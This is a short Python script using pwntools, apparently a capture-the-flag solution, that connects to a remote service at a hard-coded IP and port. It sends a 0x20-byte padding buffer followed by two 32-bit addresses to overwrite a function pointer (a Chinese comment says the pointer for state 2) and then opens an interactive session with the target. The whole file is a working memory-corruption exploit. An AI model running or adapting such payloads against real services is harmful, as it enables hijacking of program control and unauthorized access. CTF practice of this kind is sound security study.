from pwn import *

context.log_level = 'DEBUG'

# p = process('../file/d033ab68b3e64913a1b6b1029ef3dc29')
p = remote('61.147.171.105', '60694')

input('continue?')

# 覆盖状态2对应的函数指针
payload = b'a' * 0x20 + p32(0x080486cc) + p32(0x080486cc)
p.sendlineafter(b'> ', b'test')
p.sendlineafter(b'> ', payload)

p.interactive()